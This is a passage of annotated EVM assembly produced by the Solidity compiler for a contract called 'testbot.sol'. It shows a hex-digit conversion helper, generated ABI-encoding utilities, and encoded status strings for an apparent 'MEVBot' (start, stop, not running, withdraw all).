/* \"testbot.sol\":3604:3626  uint8(bytes1(\"0\")) + d */\n      tag_223\n      swap2\n      swap1\n      tag_224\n      jump\t// in\n    tag_223:\n        /* \"testbot.sol\":3597:3627  bytes1(uint8(bytes1(\"0\")) + d) */\n      0xf8\n      shl\n        /* \"testbot.sol\":3590:3627  return bytes1(uint8(bytes1(\"0\")) + d) */\n      swap1\n      pop\n      jump(tag_220)\n        /* \"testbot.sol\":3554:3749  if (0 <= d && d <= 9) {... */\n    tag_222:\n        /* \"testbot.sol\":3660:3661  d */\n      dup2\n        /* \"testbot.sol\":3648:3662  10 <= uint8(d) */\n      0xff\n      and\n        /* \"testbot.sol\":3648:3650  10 */\n      0x0a\n        /* \"testbot.sol\":3648:3662  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"testbot.sol\":3648:3680  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_226\n      jumpi\n      pop\n        /* \"testbot.sol\":3678:3680  15 */\n      0x0f\n        /* \"testbot.sol\":3672:3673  d */\n      dup3\n        /* \"testbot.sol\":3666:3680  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"testbot.sol\":3648:3680  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_226:\n        /* \"testbot.sol\":3644:3749  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n      iszero\n      tag_227\n      jumpi\n        /* \"testbot.sol\":3735:3737  10 */\n      0x0a\n        /* \"testbot.sol\":3731:3732  d */\n      dup3\n        /* \"testbot.sol\":3716:3727  bytes1(\"a\") */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"testbot.sol\":3710:3728  uint8(bytes1(\"a\")) */\n      0xf8\n      shr\n        /* \"testbot.sol\":3710:3732  uint8(bytes1(\"a\")) + d */\n      tag_228\n      swap2\n      swap1\n      tag_224\n      jump\t// in\n    tag_228:\n        /* \"testbot.sol\":3710:3737  uint8(bytes1(\"a\")) + d - 10 */\n      tag_229\n      swap2\n      swap1\n      tag_230\n      jump\t// in\n    tag_229:\n        /* \"testbot.sol\":3703:3738  bytes1(uint8(bytes1(\"a\")) + d - 10) */\n      0xf8\n      shl\n        /* \"testbot.sol\":3696:3738  return bytes1(uint8(bytes1(\"a\")) + d - 10) */\n      swap1\n      pop\n      jump(tag_220)\n        /* \"testbot.sol\":3644:3749  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n    tag_227:\n        /* \"testbot.sol\":3798:3806  revert() */\n      0x00\n      dup1\n      revert\n        /* \"testbot.sol\":3484:3813  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\n    tag_220:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_231:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_232:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_267\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_231\n      jump\t// in\n    tag_267:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_233:\n        /* \"#utility.yul\":328:352   */\n      tag_269\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_232\n      jump\t// in\n    tag_269:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_23:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_271\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_233\n      jump\t// in\n    tag_271:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":593:683   */\n    tag_234:\n        /* \"#utility.yul\":627:634   */\n      0x00\n        /* \"#utility.yul\":670:675   */\n      dup2\n        /* \"#utility.yul\":663:676   */\n      iszero\n        /* \"#utility.yul\":656:677   */\n      iszero\n        /* \"#utility.yul\":645:677   */\n      swap1\n      pop\n        /* \"#utility.yul\":593:683   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":689:798   */\n    tag_235:\n        /* \"#utility.yul\":770:791   */\n      tag_274\n        /* \"#utility.yul\":785:790   */\n      dup2\n        /* \"#utility.yul\":770:791   */\n      tag_234\n      jump\t// in\n    tag_274:\n        /* \"#utility.yul\":765:768   */\n      dup3\n        /* \"#utility.yul\":758:792   */\n      mstore\n        /* \"#utility.yul\":689:798   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":804:1014   */\n    tag_38:\n        /* \"#utility.yul\":891:895   */\n      0x00\n        /* \"#utility.yul\":929:931   */\n      0x20\n        /* \"#utility.yul\":918:927   */\n      dup3\n        /* \"#utility.yul\":914:932   */\n      add\n        /* \"#utility.yul\":906:932   */\n      swap1\n      pop\n        /* \"#utility.yul\":942:1007   */\n      tag_276\n        /* \"#utility.yul\":1004:1005   */\n      0x00\n        /* \"#utility.yul\":993:1002   */\n      dup4\n        /* \"#utility.yul\":989:1006   */\n      add\n        /* \"#utility.yul\":980:986   */\n      dup5\n        /* \"#utility.yul\":942:1007   */\n      tag_235\n      jump\t// in\n    tag_276:\n        /* \"#utility.yul\":804:1014   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1020:1189   */\n    tag_236:\n        /* \"#utility.yul\":1104:1115   */\n      0x00\n        /* \"#utility.yul\":1138:1144   */\n      dup3\n        /* \"#utility.yul\":1133:1136   */\n      dup3\n        /* \"#utility.yul\":1126:1145   */\n      mstore\n        /* \"#utility.yul\":1178:1182   */\n      0x20\n        /* \"#utility.yul\":1173:1176   */\n      dup3\n        /* \"#utility.yul\":1169:1183   */\n      add\n        /* \"#utility.yul\":1154:1183   */\n      swap1\n      pop\n        /* \"#utility.yul\":1020:1189   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1195:1357   */\n    tag_237:\n        /* \"#utility.yul\":1335:1349   */\n      0x4d4556426f742073746f702e0000000000000000000000000000000000000000\n        /* \"#utility.yul\":1331:1332   */\n      0x00\n        /* \"#utility.yul\":1323:1329   */\n      dup3\n        /* \"#utility.yul\":1319:1333   */\n      add\n        /* \"#utility.yul\":1312:1350   */\n      mstore\n        /* \"#utility.yul\":1195:1357   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1363:1729   */\n    tag_238:\n        /* \"#utility.yul\":1505:1508   */\n      0x00\n        /* \"#utility.yul\":1526:1593   */\n      tag_280\n        /* \"#utility.yul\":1590:1592   */\n      0x0c\n        /* \"#utility.yul\":1585:1588   */\n      dup4\n        /* \"#utility.yul\":1526:1593   */\n      tag_236\n      jump\t// in\n    tag_280:\n        /* \"#utility.yul\":1519:1593   */\n      swap2\n      pop\n        /* \"#utility.yul\":1602:1695   */\n      tag_281\n        /* \"#utility.yul\":1691:1694   */\n      dup3\n        /* \"#utility.yul\":1602:1695   */\n      tag_237\n      jump\t// in\n    tag_281:\n        /* \"#utility.yul\":1720:1722   */\n      0x20\n        /* \"#utility.yul\":1715:1718   */\n      dup3\n        /* \"#utility.yul\":1711:1723   */\n      add\n        /* \"#utility.yul\":1704:1723   */\n      swap1\n      pop\n        /* \"#utility.yul\":1363:1729   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1735:2154   */\n    tag_45:\n        /* \"#utility.yul\":1901:1905   */\n      0x00\n        /* \"#utility.yul\":1939:1941   */\n      0x20\n        /* \"#utility.yul\":1928:1937   */\n      dup3\n        /* \"#utility.yul\":1924:1942   */\n      add\n        /* \"#utility.yul\":1916:1942   */\n      swap1\n      pop\n        /* \"#utility.yul\":1988:1997   */\n      dup2\n        /* \"#utility.yul\":1982:1986   */\n      dup2\n        /* \"#utility.yul\":1978:1998   */\n      sub\n        /* \"#utility.yul\":1974:1975   */\n      0x00\n        /* \"#utility.yul\":1963:1972   */\n      dup4\n        /* \"#utility.yul\":1959:1976   */\n      add\n        /* \"#utility.yul\":1952:1999   */\n      mstore\n        /* \"#utility.yul\":2016:2147   */\n      tag_283\n        /* \"#utility.yul\":2142:2146   */\n      dup2\n        /* \"#utility.yul\":2016:2147   */\n      tag_238\n      jump\t// in\n    tag_283:\n        /* \"#utility.yul\":2008:2147   */\n      swap1\n      pop\n        /* \"#utility.yul\":1735:2154   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2160:2237   */\n    tag_239:\n        /* \"#utility.yul\":2197:2204   */\n      0x00\n        /* \"#utility.yul\":2226:2231   */\n      dup2\n        /* \"#utility.yul\":2215:2231   */\n      swap1\n      pop\n        /* \"#utility.yul\":2160:2237   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2243:2361   */\n    tag_240:\n        /* \"#utility.yul\":2330:2354   */\n      tag_286\n        /* \"#utility.yul\":2348:2353   */\n      dup2\n        /* \"#utility.yul\":2330:2354   */\n      tag_239\n      jump\t// in\n    tag_286:\n        /* \"#utility.yul\":2325:2328   */\n      dup3\n        /* \"#utility.yul\":2318:2355   */\n      mstore\n        /* \"#utility.yul\":2243:2361   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2367:2699   */\n    tag_52:\n        /* \"#utility.yul\":2488:2492   */\n      0x00\n        /* \"#utility.yul\":2526:2528   */\n      0x40\n        /* \"#utility.yul\":2515:2524   */\n      dup3\n        /* \"#utility.yul\":2511:2529   */\n      add\n        /* \"#utility.yul\":2503:2529   */\n      swap1\n      pop\n        /* \"#utility.yul\":2539:2610   */\n      tag_288\n        /* \"#utility.yul\":2607:2608   */\n      0x00\n        /* \"#utility.yul\":2596:2605   */\n      dup4\n        /* \"#utility.yul\":2592:2609   */\n      add\n        /* \"#utility.yul\":2583:2589   */\n      dup6\n        /* \"#utility.yul\":2539:2610   */\n      tag_233\n      jump\t// in\n    tag_288:\n        /* \"#utility.yul\":2620:2692   */\n      tag_289\n        /* \"#utility.yul\":2688:2690   */\n      0x20\n        /* \"#utility.yul\":2677:2686   */\n      dup4\n        /* \"#utility.yul\":2673:2691   */\n      add\n        /* \"#utility.yul\":2664:2670   */\n      dup5\n        /* \"#utility.yul\":2620:2692   */\n      tag_240\n      jump\t// in\n    tag_289:\n        /* \"#utility.yul\":2367:2699   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2786:2903   */\n    tag_242:\n        /* \"#utility.yul\":2895:2896   */\n      0x00\n        /* \"#utility.yul\":2892:2893   */\n      dup1\n        /* \"#utility.yul\":2885:2897   */\n      revert\n        /* \"#utility.yul\":3032:3148   */\n    tag_244:\n        /* \"#utility.yul\":3102:3123   */\n      tag_294\n        /* \"#utility.yul\":3117:3122   */\n      dup2\n        /* \"#utility.yul\":3102:3123   */\n      tag_234\n      jump\t// in\n    tag_294:\n        /* \"#utility.yul\":3095:3100   */\n      dup2\n        /* \"#utility.yul\":3092:3124   */\n      eq\n        /* \"#utility.yul\":3082:3142   */\n      tag_295\n      jumpi\n        /* \"#utility.yul\":3138:3139   */\n      0x00\n        /* \"#utility.yul\":3135:3136   */\n      dup1\n        /* \"#utility.yul\":3128:3140   */\n      revert\n        /* \"#utility.yul\":3082:3142   */\n    tag_295:\n        /* \"#utility.yul\":3032:3148   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3154:3291   */\n    tag_245:\n        /* \"#utility.yul\":3208:3213   */\n      0x00\n        /* \"#utility.yul\":3239:3245   */\n      dup2\n        /* \"#utility.yul\":3233:3246   */\n      mload\n        /* \"#utility.yul\":3224:3246   */\n      swap1\n      pop\n        /* \"#utility.yul\":3255:3285   */\n      tag_297\n        /* \"#utility.yul\":3279:3284   */\n      dup2\n        /* \"#utility.yul\":3255:3285   */\n      tag_244\n      jump\t// in\n    tag_297:\n        /* \"#utility.yul\":3154:3291   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3297:3642   */\n    tag_56:\n        /* \"#utility.yul\":3364:3370   */\n      0x00\n        /* \"#utility.yul\":3413:3415   */\n      0x20\n        /* \"#utility.yul\":3401:3410   */\n      dup3\n        /* \"#utility.yul\":3392:3399   */\n      dup5\n        /* \"#utility.yul\":3388:3411   */\n      sub\n        /* \"#utility.yul\":3384:3416   */\n      slt\n        /* \"#utility.yul\":3381:3500   */\n      iszero\n      tag_299\n      jumpi\n        /* \"#utility.yul\":3419:3498   */\n      tag_300\n      tag_242\n      jump\t// in\n    tag_300:\n        /* \"#utility.yul\":3381:3500   */\n    tag_299:\n        /* \"#utility.yul\":3539:3540   */\n      0x00\n        /* \"#utility.yul\":3564:3625   */\n      tag_301\n        /* \"#utility.yul\":3617:3624   */\n      dup5\n        /* \"#utility.yul\":3608:3614   */\n      dup3\n        /* \"#utility.yul\":3597:3606   */\n      dup6\n        /* \"#utility.yul\":3593:3615   */\n      add\n        /* \"#utility.yul\":3564:3625   */\n      tag_245\n      jump\t// in\n    tag_301:\n        /* \"#utility.yul\":3554:3625   */\n      swap2\n      pop\n        /* \"#utility.yul\":3510:3635   */\n      pop\n        /* \"#utility.yul\":3297:3642   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3648:3811   */\n    tag_246:\n        /* \"#utility.yul\":3788:3803   */\n      0x4d4556426f742073746172742e00000000000000000000000000000000000000\n        /* \"#utility.yul\":3784:3785   */\n      0x00\n        /* \"#utility.yul\":3776:3782   */\n      dup3\n        /* \"#utility.yul\":3772:3786   */\n      add\n        /* \"#utility.yul\":3765:3804   */\n      mstore\n        /* \"#utility.yul\":3648:3811   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3817:4183   */\n    tag_247:\n        /* \"#utility.yul\":3959:3962   */\n      0x00\n        /* \"#utility.yul\":3980:4047   */\n      tag_304\n        /* \"#utility.yul\":4044:4046   */\n      0x0d\n        /* \"#utility.yul\":4039:4042   */\n      dup4\n        /* \"#utility.yul\":3980:4047   */\n      tag_236\n      jump\t// in\n    tag_304:\n        /* \"#utility.yul\":3973:4047   */\n      swap2\n      pop\n        /* \"#utility.yul\":4056:4149   */\n      tag_305\n        /* \"#utility.yul\":4145:4148   */\n      dup3\n        /* \"#utility.yul\":4056:4149   */\n      tag_246\n      jump\t// in\n    tag_305:\n        /* \"#utility.yul\":4174:4176   */\n      0x20\n        /* \"#utility.yul\":4169:4172   */\n      dup3\n        /* \"#utility.yul\":4165:4177   */\n      add\n        /* \"#utility.yul\":4158:4177   */\n      swap1\n      pop\n        /* \"#utility.yul\":3817:4183   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4189:4608   */\n    tag_58:\n        /* \"#utility.yul\":4355:4359   */\n      0x00\n        /* \"#utility.yul\":4393:4395   */\n      0x20\n        /* \"#utility.yul\":4382:4391   */\n      dup3\n        /* \"#utility.yul\":4378:4396   */\n      add\n        /* \"#utility.yul\":4370:4396   */\n      swap1\n      pop\n        /* \"#utility.yul\":4442:4451   */\n      dup2\n        /* \"#utility.yul\":4436:4440   */\n      dup2\n        /* \"#utility.yul\":4432:4452   */\n      sub\n        /* \"#utility.yul\":4428:4429   */\n      0x00\n        /* \"#utility.yul\":4417:4426   */\n      dup4\n        /* \"#utility.yul\":4413:4430   */\n      add\n        /* \"#utility.yul\":4406:4453   */\n      mstore\n        /* \"#utility.yul\":4470:4601   */\n      tag_307\n        /* \"#utility.yul\":4596:4600   */\n      dup2\n        /* \"#utility.yul\":4470:4601   */\n      tag_247\n      jump\t// in\n    tag_307:\n        /* \"#utility.yul\":4462:4601   */\n      swap1\n      pop\n        /* \"#utility.yul\":4189:4608   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4614:4783   */\n    tag_248:\n        /* \"#utility.yul\":4754:4775   */\n      0x4d4556426f74206e6f742072756e6e696e672e00000000000000000000000000\n        /* \"#utility.yul\":4750:4751   */\n      0x00\n        /* \"#utility.yul\":4742:4748   */\n      dup3\n        /* \"#utility.yul\":4738:4752   */\n      add\n        /* \"#utility.yul\":4731:4776   */\n      mstore\n        /* \"#utility.yul\":4614:4783   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4789:5155   */\n    tag_249:\n        /* \"#utility.yul\":4931:4934   */\n      0x00\n        /* \"#utility.yul\":4952:5019   */\n      tag_310\n        /* \"#utility.yul\":5016:5018   */\n      0x13\n        /* \"#utility.yul\":5011:5014   */\n      dup4\n        /* \"#utility.yul\":4952:5019   */\n      tag_236\n      jump\t// in\n    tag_310:\n        /* \"#utility.yul\":4945:5019   */\n      swap2\n      pop\n        /* \"#utility.yul\":5028:5121   */\n      tag_311\n        /* \"#utility.yul\":5117:5120   */\n      dup3\n        /* \"#utility.yul\":5028:5121   */\n      tag_248\n      jump\t// in\n    tag_311:\n        /* \"#utility.yul\":5146:5148   */\n      0x20\n        /* \"#utility.yul\":5141:5144   */\n      dup3\n        /* \"#utility.yul\":5137:5149   */\n      add\n        /* \"#utility.yul\":5130:5149   */\n      swap1\n      pop\n        /* \"#utility.yul\":4789:5155   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5161:5580   */\n    tag_62:\n        /* \"#utility.yul\":5327:5331   */\n      0x00\n        /* \"#utility.yul\":5365:5367   */\n      0x20\n        /* \"#utility.yul\":5354:5363   */\n      dup3\n        /* \"#utility.yul\":5350:5368   */\n      add\n        /* \"#utility.yul\":5342:5368   */\n      swap1\n      pop\n        /* \"#utility.yul\":5414:5423   */\n      dup2\n        /* \"#utility.yul\":5408:5412   */\n      dup2\n        /* \"#utility.yul\":5404:5424   */\n      sub\n        /* \"#utility.yul\":5400:5401   */\n      0x00\n        /* \"#utility.yul\":5389:5398   */\n      dup4\n        /* \"#utility.yul\":5385:5402   */\n      add\n        /* \"#utility.yul\":5378:5425   */\n      mstore\n        /* \"#utility.yul\":5442:5573   */\n      tag_313\n        /* \"#utility.yul\":5568:5572   */\n      dup2\n        /* \"#utility.yul\":5442:5573   */\n      tag_249\n      jump\t// in\n    tag_313:\n        /* \"#utility.yul\":5434:5573   */\n      swap1\n      pop\n        /* \"#utility.yul\":5161:5580   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5586:5755   */\n    tag_250:\n        /* \"#utility.yul\":5726:5747   */\n      0x4d4556426f7420776974686472617720416c6c00000000000000000000000000\n        /* \"#utility.yul\":5722:5723   */\n      0x00\n        /* \"#utility.yul\":5714:5720   */\n      dup3\n        /* \"#utility.yul\":5710:5724   */\n      add\n        /* \"#utility.yul\":5703:5748   */\n      mstore\n        /* \"#utility.yul\":5586:5755   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5761:6127   */\n    tag_251:\n        /* \"#utility.yul\":5903:5906   */\n      0x00\n        /* \"#utility.yul\":5924:5991   */\n      tag_316\n        /* \"#utility.yul\":5988:5990   */\n      0x13\n        /* \"#utility.yul\":5983:5986   */\n      dup4\n        /* \"#utility.yul\":5924:5991   */\n      tag_236\n      jump\t// in\n    tag_316:\n        /* \"#utility.yul\":5917:5991   */\n      swap2\n      pop\n        /* \"#utility.yul\":6000:6093   */\n      tag_317\n        /* \"#utility.yul\":6089:6092   */\n      dup3\n        /* \"#utility.yul\":6000:6093   */\n      tag_250\n      jump\t// in\n    tag_317:\n        /* \"#utility.yul\":6118:6120   */\n      0x20\n        /* \"#utility.yul\":6113:6116   */\n      dup3\n        /* \"#utility.yul\":6109:6121   */\n      add\n        /* \"#utility.yul\":6102:6121   */\n      swap1\n      pop\n        /* \"#utility.yul\":5761:6127   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6133:6552   */\n    tag_72:\n        /* \"#utility.yul\":6299:6303   */\n      0x00\n        /* \"#utility.yul\":6337:6339   */\n      0x20\n        /* \"#utility.yul\":6326:6335   */\n      dup3\n        /* \"#utility.yul\":6322:6340   */\n      add\n        /* \"#utility.yul\":6314:6340   */\n      swap1\n      pop\n        /* \"#utility.yul\":6386:6395   */\n      dup2\n        /* \"#utility.yul\":6380:6384   */\n      dup2\n        /* \"#utility.yul\":6376:6396   */\n      sub\n        /* \"#utility.yul\":6372:6373   */\n      0x00\n        /* \"#utility.yul\":6361:6370   */\n      dup4\n        /* \"#utility.yul\":6357:6374   */\n      add\n        /* \"#utility.yul\":6350:6397   */\n      mstore\n        /* \"#utility.yul\":6414:6545   */\n      tag_319\n        /* \"#utility.yul\":6540:6544   */\n      dup2\n        /* \"#utility.yul\":6414:6545   */\n      tag_251\n      jump\t// in\n    tag_319:\n        /* \"#utility.yul\":6406:6545   */\n      swap1\n      pop\n        /* \"#utility.yul\":6133:6552   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6558:6738   */\n    tag_252:\n        /* \"#utility.yul\":6606:6683   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":6603:6604   */\n      0x00\n        /* \"#utility.yul\":6596:6684   */\n      mstore\n        /* \"#utility.yul\":6703:6707   */\n      0x21\n        /* \"#utility.yul\":6700:6701   */\n      0x04\n        /* \"#utility.yul\":6693:6708   */\n      mstore\n        /* \"#utility.yul\":6727:6731   */\n      0x24\n        /* \"#utility.yul\":6724:6725   */\n      0x00\n        /* \"#utility.yul\":6717:6732   */\n      revert\n        /* \"#utility.yul\":6744:6863   */\n    tag_253:\n        /* \"#utility.yul\":6831:6832   */\n      0x04\n        /* \"#utility.yul\":6824:6829   */\n      dup2\n        /* \"#utility.yul\":6821:6833   */\n      lt\n        /* \"#utility.yul\":6811:6857   */\n      tag_322\n      jumpi\n        /* \"#utility.yul\":6837:6855   */\n      tag_323\n      tag_252\n      jump\t// in\n    tag_323:\n        /* \"#utility.yul\":6811:6857   */\n    tag_322:\n        /* \"#utility.yul\":6744:6863   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6869:7008   */\n    tag_254:\n        /* \"#utility.yul\":6920:6927   */\n      0x00\n        /* \"#utility.yul\":6949:6954   */\n      dup2\n        /* \"#utility.yul\":6938:6954   */\n      swap1\n      pop\n        /* \"#utility.yul\":6955:7002   */\n      tag_325\n        /* \"#utility.yul\":6996:7001   */\n      dup3\n        /* \"#utility.yul\":6955:7002   */\n      tag_253\n      jump\t// in\n    tag_325:\n        /* \"#utility.yul\":6869:7008   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7014:7153   */\n    tag_255:\n        /* \"#utility.yul\":7076:7085   */\n      0x00\n        /* \"#utility.yul\":7109:7147   */\n      tag_327\n        /* \"#utility.yul\":7141:7146   */\n      dup3\n        /* \"#utility.yul\":7109:7147   */\n      tag_254\n      jump\t// in\n    tag_327:\n        /* \"#utility.yul\":7096:7147   */\n      swap1\n      pop\n        /* \"#utility.yul\":7014:7153   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7159:7314   */\n    tag_256:\n        /* \"#utility.yul\":7258:7307   */\n      tag_329\n        /* \"#utility.yul\":7301:7306   */\n      dup2\n        /* \"#utility.yul\":7258:7307   */\n      tag_255\n      jump\t// in\n    tag_329:\n        /* \"#utility.yul\":7253:7256   */\n      dup3\n        /* \"#utility.yul\":7246:7308   */\n      mstore\n        /* \"#utility.yul\":7159:7314   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7320:7786   */\n    tag_81:\n        /* \"#utility.yul\":7481:7485   */\n      0x00\n        /* \"#utility.yul\":7519:7521   */\n      0x60\n        /* \"#utility.yul\":7508:7517   */\n      dup3\n        /* \"#utility.yul\":7504:7522   */\n      add\n        /* \"#utility.yul\":7496:7522   */\n      swap1\n      pop\n        /* \"#utility.yul\":7532:7603   */\n      tag_331\n        /* \"#utility.yul\":7600:7601   */\n      0x00\n        /* \"#utility.yul\":7589:7598   */\n      dup4\n        /* \"#utility.yul\":7585:7602   */\n      add\n        /* \"#utility.yul\":7576:7582   */\n      dup7\n        /* \"#utility.yul\":7532:7603   */\n      tag_233\n      jump\t// in\n    tag_331:\n        /* \"#utility.yul\":7613:7685   */\n      tag_332\n        /* \"#utility.yul\":7681:7683   */\n      0x20\n        /* \"#utility.yul\":7670:7679   */\n      dup4\n        /* \"#utility.yul\":7666:7684   */\n      add\n        /* \"#utility.yul\":7657:7663   */\n      dup6\n        /* \"#utility.yul\":7613:7685   */\n      tag_233\n      jump\t// in\n    tag_332:\n        /* \"#utility.yul\":7695:7779   */\n      tag_333\n        /* \"#utility.yul\":7775:7777   */\n      0x40\n        /* \"#utility.yul\":7764:7773   */\n      dup4\n        /* \"#utility.yul\":7760:7778   */\n      add\n        /* \"#utility.yul\":7751:7757   */\n      dup5\n        /* \"#utility.yul\":7695:7779   */\n      tag_256\n      jump\t// in\n    tag_333:\n        /* \"#utility.yul\":7320:7786   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7792:7890   */\n    tag_257:\n        /* \"#utility.yul\":7843:7849   */\n      0x00\n        /* \"#utility.yul\":7877:7882   */\n      dup2\n        /* \"#utility.yul\":7871:7883   */\n      mload\n        /* \"#utility.yul\":7861:7883   */\n      swap1\n      pop\n        /* \"#utility.yul\":7792:7890   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7896:8043   */\n    tag_258:\n        /* \"#utility.yul\":7997:8008   */\n      0x00\n        /* \"#utility.yul\":8034:8037   */\n      dup2\n        /* \"#utility.yul\":8019:8037   */\n      swap1\n      pop\n        /* \"#utility.yul\":7896:8043   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8049:8295   */\n    tag_259:\n        /* \"#utility.yul\":8130:8131   */\n      0x00\n        /* \"#utility.yul\":8140:8253   */\n    tag_337:\n        /* \"#utility.yul\":8154:8160   */\n      dup4\n        /* \"#utility.yul\":8151:8152   */\n      dup2\n        /* \"#utility.yul\":8148:8161   */\n      lt\n        /* \"#utility.yul\":8140:8253   */\n      iszero\n      tag_339\n      jumpi\n        /* \"#utility.yul\":8239:8240   */\n      dup1\n        /* \"#utility.yul\":8234:8237   */\n      dup3\n        /* \"#utility.yul\":8230:8241   */\n      add\n        /* \"#utility.yul\":8224:8242   */\n      mload\n        /* \"#utility.yul\":8220:8221   */\n      dup2\n        /* \"#utility.yul\":8215:8218   */\n      dup5\n        /* \"#utility.yul\":8211:8222   */\n      add\n        /* \"#utility.yul\":8204:8243   */\n      mstore\n        /* \"#utility.yul\":8176:8178   */\n      0x20\n        /* \"#utility.yul\":8173:8174   */\n      dup2\n        /* \"#utility.yul\":8169:8179   */\n      add\n        /* \"#utility.yul\":8164:8179   */\n      swap1\n      pop\n        /* \"#utility.yul\":8140:8253   */\n      jump(tag_337)\n    tag_339:\n        /* \"#utility.yul\":8287:8288   */\n      0x00\n        /* \"#utility.yul\":8278:8284   */\n      dup5\n        /* \"#utility.yul\":8273:8276   */\n      dup5\n        /* \"#utility.yul\":8269:8285   */\n      add\n        /* \"#utility.yul\":8262:8289   */\n      mstore\n        /* \"#utility.yul\":8111:8295   */\n      pop\n        /* \"#utility.yul\":8049:8295   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8301:8687   */\n    tag_260:\n        /* \"#utility.yul\":8405:8408   */\n      0x00\n        /* \"#utility.yul\":8433:8471   */\n      tag_341\n        /* \"#utility.yul\":8465:8470   */\n      dup3\n        /* \"#utility.yul\":8433:8471   */\n      tag_257\n      jump\t// in\n    tag_341:\n        /* \"#utility.yul\":8487:8575   */\n      tag_342\n        /* \"#utility.yul\":8568:8574   */\n      dup2\n        /* \"#utility.yul\":8563:8566   */\n      dup6\n        /* \"#utility.yul\":8487:8575   */\n      tag_258\n      jump\t// in\n    tag_342:\n        /* \"#utility.yul\":8480:8575   */\n      swap4\n      pop\n        /* \"#utility.yul\":8584:8649   */\n      tag_343\n        /* \"#utility.yul\":8642:8648   */\n      dup2\n        /* \"#utility.yul\":8637:8640   */\n      dup6\n        /* \"#utility.yul\":8630:8634   */\n      0x20\n        /* \"#utility.yul\":8623:8628   */\n      dup7\n        /* \"#utility.yul\":8619:8635   */\n      add\n        /* \"#utility.yul\":8584:8649   */\n      tag_259\n      jump\t// in\n    tag_343:\n        /* \"#utility.yul\":8674:8680   */\n      dup1\n        /* \"#utility.yul\":8669:8672   */\n      dup5\n        /* \"#utility.yul\":8665:8681   */\n      add\n        /* \"#utility.yul\":8658:8681   */\n      swap2\n      pop\n        /* \"#utility.yul\":8409:8687   */\n      pop\n        /* 